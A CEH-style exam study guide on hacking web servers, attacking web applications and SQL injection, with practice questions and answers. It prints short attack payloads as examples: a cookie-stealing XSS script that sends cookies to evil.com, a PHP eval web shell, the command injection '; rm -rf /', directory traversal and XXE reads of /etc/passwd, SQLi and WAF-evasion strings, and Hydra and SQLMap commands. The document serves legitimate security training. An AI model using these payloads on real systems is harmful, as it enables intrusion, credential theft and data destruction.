# Domain 5: Web Application Hacking

## Sub-Domain: Hacking Web Servers

---

## Web Server Concepts

**Core Concept:** A web server hosts websites, processing HTTP/HTTPS requests. Common servers: Apache, IIS, Nginx. Attackers target web server vulnerabilities (misconfigurations, default accounts) to gain access or deface.

**Key Tools:** Nmap (`nmap -sV -p 80,443 target`), Netcat (banner grabbing: `nc target 80`), WhatWeb (`whatweb target`).

**Port Numbers & Protocols:** HTTP 80, HTTPS 443.

**Common Pitfalls:**
- IIS runs on Windows and uses ISAPI extensions; Apache runs on Linux/Unix.
- Default IIS directory: `C:\Inetpub\wwwroot`; Apache: `/var/www/html`.

**Countermeasures:** Patch server software, remove default files, disable directory listing, and run with least privilege.

**Practice Question:**

An organization's public-facing web server shows "Apache/2.4.7 (Ubuntu)" in the HTTP response header. What can an attacker infer?
- A) The server uses IIS
- B) The server is running on Windows
- C) The server is vulnerable to SQL injection
- D) The server OS and web server version

> **Answer: D** -- The banner reveals software and OS.
---

## Web Server Attacks

**Core Concept:** Attacks include directory traversal, defacement, DoS, buffer overflow, and exploiting misconfigured authentication. Attackers aim to compromise the server or its hosted applications.

**Key Tools:** DirBuster (`java -jar DirBuster.jar`), Metasploit web server exploits, Nikto (`nikto -h target`).

**Port Numbers & Protocols:** HTTP 80, HTTPS 443.

**Common Pitfalls:**
- Directory traversal (`../` sequences) attempts to access files outside the web root.
- IIS Unicode vulnerability used `%c0%af` to bypass filters.
- Countermeasure: input validation and ACLs.

**Countermeasures:** Secure configuration, disable unnecessary HTTP methods, apply patches, and use WAF.

**Practice Question:**

An attacker sends a request `GET /../../../../etc/passwd HTTP/1.1` to a web server. What attack is being attempted?
- A) CSRF
- B) XSS
- C) Directory traversal
- D) SQL injection

> **Answer: C** -- Dot-dot-slash attempts to access files outside web root.
---

## Web Server Attack Methodology

**Core Concept:** The methodology includes information gathering, footprinting the web server, scanning for vulnerabilities, exploiting vulnerabilities, and maintaining access. It mirrors the general hacking phases but focused on the server.

**Key Tools:** Recon: Netcraft, Shodan. Scanning: Nikto, Nmap. Exploit: Metasploit. Post-exploit: netcat backdoors.

**Port Numbers & Protocols:** 80, 443, 8080 (common alternative).

**Common Pitfalls:**
- EC-Council's methodology steps: (1) Information gathering, (2) Web server footprinting, (3) Website mirroring, (4) Vulnerability scanning, (5) Session hijacking, (6) Web server password cracking.

**Countermeasures:** Regular vulnerability scans, log monitoring, and using hardened templates.

**Practice Question:**

After mirroring a target website using HTTrack, an attacker scans the local copy for comments and hidden paths. Which phase is this?
- A) Session hijacking
- B) Web server footprinting
- C) Vulnerability scanning
- D) Information gathering

> **Answer: B** -- Footprinting includes analyzing mirrored content for clues.
---

## Web Server Attack Countermeasures

**Core Concept:** Harden the web server by removing unnecessary services, applying patches, using secure protocols, setting proper permissions, and deploying a web application firewall (WAF).

**Key Tools:** Microsoft Baseline Security Analyzer (MBSA), IIS Lockdown Tool, Apache mod_security (WAF).

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Changing default banners (obscurity) is not sufficient but can slow automated attacks.
- Disable WebDAV if not needed.

**Countermeasures:** Implement secure configuration standards, change default credentials, restrict access via IP, use WAF, monitor logs.

**Practice Question:**

Which measure best protects a web server from known attack signatures?
- A) Disable ICMP
- B) Deploy a Web Application Firewall with updated rules
- C) Use HTTPS
- D) Change the server banner

> **Answer: B** -- A WAF can filter malicious payloads based on signatures.
---

## Patch Management

**Core Concept:** Regularly updating web server software, OS, and applications to fix known vulnerabilities. Attackers exploit unpatched servers (e.g., outdated Apache Struts). Patch management includes testing and deployment.

**Key Tools:** WSUS (Windows), unattended-upgrades (Linux), Nessus, SCCM.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- **Hotfix** -- single fix; **service pack** -- cumulative.
- Proper patch management requires testing in a non-production environment first.

**Countermeasures:** Implement a formal patch management policy, automate where possible, and monitor for new vulnerability disclosures (CVE).

**Practice Question:**

A security team discovers a critical vulnerability in Apache. What should they do before applying the patch to the production server?
- A) Immediately apply it
- B) Shut down the server
- C) Ignore until next monthly cycle
- D) Test the patch in a staging environment

> **Answer: D** -- Testing ensures the patch will not disrupt the application.
---

## Sub-Domain: Hacking Web Applications

---

## Web App Concepts

**Core Concept:** Web applications run on the server-side, processed via HTTP. They consist of client-side code (HTML/JS), server-side logic (PHP, ASP.NET, Java), and databases. Attackers target the application layer because it often has weak security controls.

**Key Tools:** Burp Suite, OWASP ZAP, browser dev tools, Wappalyzer (identify tech stack), Acunetix, Netsparker.

**Port Numbers & Protocols:** HTTP 80, HTTPS 443

**Common Pitfalls:**
- Web 2.0 uses AJAX, JSON, APIs.
- Countermeasure: Secure coding (input validation, output encoding), regular testing.

**Practice Question:**

An application processes user-supplied search queries and reflects results without sanitization. What is the potential security risk?
- A) Buffer overflow
- B) SQL injection
- C) Reflected XSS
- D) Directory traversal

> **Answer: C** -- Reflected input directly in page allows XSS.
---

## Web App Threats

**Core Concept:** OWASP Top 10 lists major web app risks: injection, broken authentication, sensitive data exposure, XXE, broken access control, security misconfiguration, XSS, insecure deserialization, using components with known vulnerabilities, insufficient logging.

**Key Tools:** Burp Suite, SQLMap, XSSer, OWASP ZAP.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- EC-Council heavily tests OWASP Top 10.
- Countermeasure: use secure development lifecycle, code review, penetration testing.

**Practice Question:**

A web app accepts XML input and processes external entities, allowing an attacker to read local files. This vulnerability is:
- A) CSRF
- B) File upload
- C) XML External Entity (XXE)
- D) SQL Injection

> **Answer: C** -- XXE processes external entity references.
---

## Web App Hacking Methodology

**Core Concept:** CEH's structured approach: (1) Footprint web infrastructure, (2) Analyze web applications, (3) Bypass client-side controls, (4) Attack authentication, (5) Attack authorization, (6) Attack session management, (7) Perform injection attacks, (8) Attack application logic, (9) Attack shared environments, (10) Attack database connectivity, (11) Attack web services, (12) Attack web app client.

**Key Tools:** Each phase uses tools: Nmap, WhatWeb (footprint); Burp Spider (analysis); Burp Repeater (bypass controls); Hydra (authentication).

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The exact order and phase names may appear on the exam.

**Practice Question:**

According to CEH, which step comes immediately after analyzing the web application's structure?
- A) Bypass client-side controls
- B) Attack session management
- C) Perform SQL injection
- D) Attack authentication

> **Answer: A** -- The sequence is: footprint, analyze, bypass client-side, then attack authentication.
---

## Footprint Web Infrastructure

**Core Concept:** Discover servers, load balancers, web server software, technology stack, and hidden content. Includes domain lookups, WHOIS, DNS enumeration, and identifying other apps on the same server.

**Key Tools:** dnsrecon, Sublist3r, theHarvester, Shodan, Nmap (`--script http-enum`), WhatWeb.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Discovering virtual hosts via DNS.
- Using SHODAN to find web servers by banner.

**Practice Question:**

A pen tester uses `dnsrecon -d target.com -t axfr` and gets a list of all subdomains. This succeeded because:
- A) SMTP VRFY was enabled
- B) The web server had directory listing
- C) The DNS server allowed zone transfer
- D) SNMP was open

> **Answer: C** -- Zone transfer (AXFR) provides full DNS records.
---

## Analyze Web Applications

**Core Concept:** Examine the application's structure, parameters, hidden fields, cookies, and API endpoints. Identify data entry points and logic. This phase maps the attack surface.

**Key Tools:** Burp Suite Spider, OWASP ZAP Spider, Dirbuster/gobuster, developer tools (F12), Wfuzz.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Spidering vs. directory brute-forcing.
- Robots.txt may list disallowed directories.

**Practice Question:**

An attacker finds that changing the hidden field `price=100` to `price=1` allows purchasing an item for $1. What web app flaw is this?
- A) XSS
- B) Parameter tampering
- C) CSRF
- D) SQL injection

> **Answer: B** -- Altering a parameter (hidden field) that the server trusts is parameter tampering.
---

## Bypass Client-Side Controls

**Core Concept:** Client-side controls (JavaScript validation, disabled submit buttons, input length limits) can be easily bypassed by disabling JavaScript, using a proxy to modify requests, or sending direct HTTP requests. Never trust client-side security.

**Key Tools:** Burp Suite Proxy (Intercept and modify), browser dev tools, curl or Python requests.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Any client-side validation can be bypassed; server-side validation is mandatory.

**Practice Question:**

A web app uses JavaScript to validate that an email field contains '@'. How can an attacker bypass this?
- A) CSRF
- B) SQL injection
- C) XSS
- D) Disable JavaScript and send the request with a proxy

> **Answer: D** -- Removing client-side checks allows sending malicious input directly to the server.
---

## Attack Authentication Mechanism

**Core Concept:** Attacks include brute-force, credential stuffing, bypassing authentication via SQL injection, exploiting "Remember Me" features, and abusing weak password reset functionality.

**Key Tools:**
- Hydra: `hydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
- Burp Intruder (pitchfork attack)
- SQLi login bypass: `admin'--`

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- EC-Council tests default credentials for various devices.
- Password reset weakness (security questions).
- Countermeasure: Multi-factor authentication, account lockout, CAPTCHA, and secure password recovery.

**Practice Question:**

An attacker uses the username `admin'--` and a blank password on a login form, gaining access. Which attack?
- A) SQL injection authentication bypass
- B) Brute force
- C) Session hijacking
- D) XSS

> **Answer: A** -- The input comments out the rest of the SQL query, bypassing password check.
---

## Attack Authorization Schemes

**Core Concept:** Authorization controls what an authenticated user can do. Flaws include Insecure Direct Object References (IDOR), missing function-level access control, and privilege escalation. Attackers access other users' data or admin functions.

**Key Tools:** Burp Suite Repeater, Dirbuster, authorization testing with low-privilege requests.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- IDOR is a classic test topic.
- Horizontal vs vertical privilege escalation.
- Countermeasure: Access control checks on server side for every request, use random and unpredictable IDs, implement role-based access.

**Practice Question:**

After logging in as a regular user, an attacker changes the URL from `/profile/123` to `/profile/124` and sees another user's profile. This indicates:
- A) Broken authentication
- B) SQL injection
- C) CSRF
- D) Insecure Direct Object Reference

> **Answer: D** -- Direct reference to object with no authorization check.
---

## Attack Access Controls

**Core Concept:** Access control enforces authorization. Weaknesses allow unauthorized access to functionality or data. Includes forced browsing (accessing pages without links) and parameter manipulation to elevate privileges.

**Key Tools:** Dirbuster, gobuster (`gobuster dir -u http://target.com -w wordlist.txt`), Burp Sequencer, curl.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Forced browsing is a form of broken access control.
- Countermeasure: Proper authentication for all sensitive pages, not hiding them.

**Practice Question:**

A web application has no link to the admin page, but the developer left the page accessible at `/admin.php`. An attacker discovers it via directory brute-force. This is:
- A) Session hijacking
- B) SQLi
- C) Phishing
- D) Forced browsing

> **Answer: D** -- Discovering and accessing hidden pages without authorization.
---

## Attack Session Management Mechanism

**Core Concept:** Session management handles user state. Attacks: session hijacking, session fixation, weak session ID generation, and improper session termination. Attackers exploit these to impersonate users.

**Key Tools:** Burp Sequencer (randomness analysis), Cookie Editor, Ferret/Hamster, OWASP ZAP.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Session ID must be long, random, and transmitted over HTTPS.
- Regenerate after login.
- Countermeasure: Use framework's session management, set cookie flags (HttpOnly, Secure, SameSite).

**Practice Question:**

A banking app uses a session cookie with value "user=John; sessionid=12345". The attacker changes sessionid to 12346 and becomes another user. What is the flaw?
- A) SQL injection
- B) CSRF
- C) XSS
- D) Weak session ID generation (predictable)

> **Answer: D** -- Predictable session IDs allow attacker to assume other sessions.
---

## Perform Injection/Input Validation Attacks

**Core Concept:** Injection attacks exploit flawed input handling to execute unintended commands. Includes SQL, OS command, LDAP, XML, XPath, and Server-Side Template Injection (SSTI). The attacker injects malicious syntax into an interpreter.

**Key Tools:** SQLMap (SQLi), Commix (command injection), Burp Intruder (fuzzing).

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Command injection: using `;`, `|`, `&&`.
- SQL injection: `' OR 1=1 --`.
- LDAP injection: `*` or `admin)(&`.
- Countermeasure: Use parameterized queries, input validation, escape special characters, least privilege for interpreter.

**Practice Question:**

A web app has a search form that runs a system command `grep -i user_input file`. An attacker inputs `; rm -rf /`. What attack?
- A) File inclusion
- B) SQL injection
- C) OS command injection
- D) XSS

> **Answer: C** -- The semicolon allows execution of an additional command.
---

## Attack Application Logic Flaws

**Core Concept:** Logic flaws are errors in the workflow, such as purchasing items with negative quantity, bypassing payment steps, or performing actions out of intended order. These are hard to automate.

**Key Tools:** Burp Suite to tamper with sequence and data, manual testing with creative thinking.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Logic flaws require understanding business processes.
- Countermeasure: Validate business rules on server, implement stateful workflows, prevent users from skipping steps.

**Practice Question:**

A travel booking site allows a user to book a flight, then change the passenger name after payment. An attacker books a cheap ticket, then changes the name to a different flight. This is an example of:
- A) XSS
- B) Application logic flaw
- C) SQL injection
- D) CSRF

> **Answer: B** -- The logic flaw allows modification after payment in a way that violates business rules.
---

## Attack Shared Environments

**Core Concept:** In shared hosting, multiple websites reside on one server. Attackers compromise one site and then escalate to other sites or the server itself. Vulnerability: weak isolation, shared databases, same IP.

**Key Tools:** Web shell (c99, r57), Metasploit privilege escalation, Cpanel brute-force.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Shared hosting risks: other tenant's insecurity becomes your risk.
- Countermeasure: Use VPS or dedicated server, proper file permissions, and containerization.

**Practice Question:**

A website hosted on shared hosting is defaced. The attacker uploaded a shell via a vulnerability in another site on the same server. This is possible because of:
- A) Insufficient isolation in shared hosting
- B) SQL injection
- C) Cross-site scripting
- D) DNS poisoning

> **Answer: A** -- The shared environment allowed cross-site contamination.
---

## Attack Database Connectivity

**Core Concept:** Web apps connect to databases using connection strings. Attackers target database server credentials, weak connection encryption, or unprotected connection files. Obtaining DB credentials leads to data breach.

**Key Tools:** SQLMap, Netcat (banner grab database: MySQL 3306), Nmap (`nmap -sV -p 3306 target`), Metasploit modules.

**Port Numbers & Protocols:** MySQL 3306, MSSQL 1433, Oracle 1521.

**Common Pitfalls:**
- Connection string injection possible.
- Countermeasure: Encrypt connection strings, use least privilege DB accounts, restrict DB server access, enable SSL/TLS.

**Practice Question:**

An attacker obtains the database password from a web.config file exposed via directory traversal. Which attack can now be conducted?
- A) Phishing
- B) Direct database access and data exfiltration
- C) Session hijacking
- D) XSS

> **Answer: B** -- With credentials, direct DB access.
---

## Attack Web App Client

**Core Concept:** Exploiting vulnerabilities on the client side: Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Clickjacking, HTML injection. These target the user's browser, often via the web app.

**Key Tools:** XSS payloads: `<script>alert(1)</script>`, Burp Suite, XSSer, BeEF (browser exploitation), CSRF PoC generator in Burp.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- **Stored XSS** -- script saved on server, executed by other users
- **Reflected XSS** -- attacker sends a link with malicious script
- **DOM-based XSS** -- script runs in the DOM
- CSRF requires user to be authenticated.
- Countermeasure: Output encoding, Content Security Policy (CSP), anti-CSRF tokens.

**Practice Question:**

An attacker posts a message on a forum containing `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>`. All forum visitors lose their session cookies. This is:
- A) Stored XSS
- B) SQL injection
- C) Reflected XSS
- D) CSRF

> **Answer: A** -- The script is stored on the server and executed for every visitor.
---

## Attack Web Services

**Core Concept:** Web services (SOAP, REST) exchange data between applications. Vulnerabilities: injection, broken authentication, and XML-related attacks (XXE, XPath injection). Attackers test API endpoints for weaknesses.

**Key Tools:** Postman, Burp Suite, SoapUI, WSDL analysis, Nmap script: `http-soap-methods`.

**Port Numbers & Protocols:** SOAP uses XML; REST uses JSON. WSDL describes SOAP services.

**Common Pitfalls:**
- SOAP uses XML, REST uses JSON.
- UDDI is the discovery protocol.
- Countermeasure: validate all API inputs, use OAuth for authentication, encrypt API keys.

**Practice Question:**

A web service uses SOAP and accepts XML input. An attacker includes `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and gets the file contents. This is:
- A) XSS
- B) XXE injection
- C) SQL injection
- D) CSRF

> **Answer: B** -- XXE reads local files via external entity.
---

## Web API, Webhooks, and Web Shell

**Core Concept:** Web APIs (RESTful) expose functionality; attackers exploit insecure endpoints. Webhooks allow real-time data push; can be spoofed. A web shell is a malicious script uploaded to a server for remote command execution.

**Key Tools:** Postman, curl, Gobuster (API endpoint discovery). Common web shells: c99, r57, Weevely (`weevely generate password shell.php`).

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Web shell detection by looking for suspicious PHP/ASPX files.
- Countermeasure: Restrict file upload types, scan uploaded files with AV, use WAF to detect shell commands.

**Practice Question:**

A defender finds a file `images.php` in the uploads folder containing `<?php eval(base64_decode($_POST['cmd'])); ?>`. What is this file?
- A) Legitimate image processor
- B) API endpoint
- C) Database connector
- D) A web shell

> **Answer: D** -- The code executes arbitrary commands sent via POST, a typical web shell.
---

## Web App Security

**Core Concept:** Securing web apps involves secure coding, regular testing, patching, deploying WAF, and implementing security headers (CSP, HSTS). Defenses target each vulnerability class.

**Key Tools:** ModSecurity (WAF), SonarQube (SAST), OWASP ZAP (DAST). Security headers: `X-Content-Type-Options: nosniff`, `Content-Security-Policy`.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Input validation is the most important defense.
- Output encoding prevents XSS.
- The secure flag in cookies is critical.

**Practice Question:**

Which HTTP response header instructs the browser to only communicate over HTTPS?
- A) Strict-Transport-Security
- B) Content-Security-Policy
- C) X-Frame-Options
- D) Cache-Control

> **Answer: A** -- HSTS enforces HTTPS.
---

## Sub-Domain: SQL Injection

---

## SQL Injection Concepts

**Core Concept:** SQL injection (SQLi) injects malicious SQL code into a query to manipulate the database. Results: bypass authentication, extract data, alter data, or execute OS commands (in some DBs). It is the most critical web vulnerability.

**Key Tools:** SQLMap (`sqlmap -u "http://target/page?id=1" --dbs`), manual testing with single quote (`'`), Burp Suite, Havij.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Error-based, union-based, blind (boolean/time) are main types.
- Countermeasure: Parameterized queries (prepared statements), stored procedures, input validation, least privilege DB account.

**Practice Question:**

An attacker inputs `' OR 1=1 --` into a login form and gains access. What SQLi technique?
- A) Error-based
- B) Authentication bypass via true condition
- C) Blind SQLi
- D) Union-based

> **Answer: B** -- The injected condition is always true, bypassing authentication.
---

## Types of SQL Injection

**Core Concept:**
- **In-band SQLi** (data returned in same channel): error-based and union-based
- **Blind SQLi** (no data in response): boolean-based and time-based
- **Out-of-band SQLi** (different channel) uses DNS or HTTP requests

**Key Tools:** SQLMap with `--technique` flag (B: Boolean, E: Error, U: Union, S: Stacked, T: Time). Manual payloads: `' UNION SELECT 1,2,3--`. Time-based: `' WAITFOR DELAY '0:0:5'--` (MSSQL).

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Blind SQLi is slower but effective when no errors or union data visible.
- Time-based uses `SLEEP()` in MySQL, `pg_sleep()` in PostgreSQL, `WAITFOR DELAY` in MSSQL.
- Countermeasure: proper error handling (generic error page), WAF.

**Practice Question:**

A web app does not show any database output, but an attacker injects `' AND (SELECT IF(1=1, SLEEP(5), 0))--` and the response is delayed. This is:
- A) Time-based blind SQLi
- B) Boolean blind SQLi
- C) Union-based SQLi
- D) Error-based SQLi

> **Answer: A** -- The delay indicates successful injection.
---

## SQL Injection Methodology

**Core Concept:** Systematic approach: (1) Identify injectable parameters, (2) Determine database type, (3) Test injection with various techniques, (4) Extract data (enumerate tables, columns), (5) Extract data rows, (6) Possibly pivot to OS commands.

**Key Tools:** SQLMap (automation), Burp Repeater, `ORDER BY` to find column count, `information_schema` in MySQL/MSSQL.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Using `ORDER BY` to determine column count.
- UNION SELECT needs same number of columns.
- Countermeasure: Disable detailed error messages, use whitelist input validation, parameterized queries.

**Practice Question:**

An attacker uses `?id=1 ORDER BY 10--` and gets an error, but `?id=1 ORDER BY 5--` works normally. What is concluded?
- A) The query uses 5 columns
- B) The injection is blind
- C) The database is Oracle
- D) The server is Windows

> **Answer: A** -- `ORDER BY` fails when the number is higher than the column count.
---

## SQL Injection Tools

**Core Concept:** SQLMap is the most popular automated tool; supports many DBs and techniques. Other tools: jSQL Injection (GUI), NoSQLMap (for NoSQL), BBQSQL (blind), and Burp Suite.

**Key Tools:**
- SQLMap: `sqlmap -u target --current-db`, `--dbs`, `--tables`, `--columns`, `--dump`
- jSQL: Java GUI
- Havij (old GUI)
- Mole (GUI)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- SQLMap can execute OS commands via `--os-shell` if DB user has appropriate privileges.
- `--os-pwn` for out-of-band shell.
- WAFs can block SQLMap's default user-agent; change with `--user-agent`.

**Practice Question:**

A penetration tester wants to retrieve all databases from a MySQL server using SQLMap. Which command?
- A) `sqlmap -u target --passwords`
- B) `sqlmap -u target --dbs`
- C) `sqlmap -u target --tables`
- D) `sqlmap -u target --os-shell`

> **Answer: B** -- `--dbs` enumerates databases.
---

## Evasion Techniques

**Core Concept:** Bypass WAFs and filters by using encoding (URL, hex, char), comments, case variation, buffer overflow in payload, alternative syntax, and splitting. SQLMap has tamper scripts.

**Key Tools:**
- SQLMap tamper scripts: `--tamper=between,space2comment,charencode`
- Manual: `SELECT * FROM users WHERE id=1 UNION%a0SELECT 1,2`
- Hex: `0x61646d696e` for 'admin'

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Common evasion: URL encoding (`%27` for `'`), double encoding, null byte (`%00`).
- Countermeasure: Normalize input before validation, use positive security model (allow only known good).

**Practice Question:**

A WAF blocks requests containing "UNION SELECT". An attacker bypasses it using `/*!50000UNION*/ SELECT`. This works because:
- A) It triggers a buffer overflow
- B) It uses encoding
- C) It is a comment syntax that MySQL executes as SQL
- D) It changes case

> **Answer: C** -- `/*!...*/` is a MySQL conditional comment executed by the database.
---

## SQL Injection Countermeasures

**Core Concept:** Use parameterized queries (prepared statements) to separate code from data. Stored procedures with strict parameterization. Whitelist input validation, escape special characters, least privilege DB accounts, disable detailed error messages, use WAF.

**Key Tools:** ModSecurity with SQLi rules, ORM frameworks, database permission restrictions.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Parameterized queries are the gold standard.
- Input validation alone is not enough (because sometimes special characters are needed).
- Escape functions like `mysql_real_escape_string` can be bypassed, so prepared statements are better.

**Practice Question:**

Which defense completely prevents SQL injection by ensuring user input is never interpreted as SQL?
- A) HTTPS
- B) Parameterized queries
- C) Output encoding
- D) Input validation blacklist

> **Answer: B** -- Parameterized queries (prepared statements) separate code from data.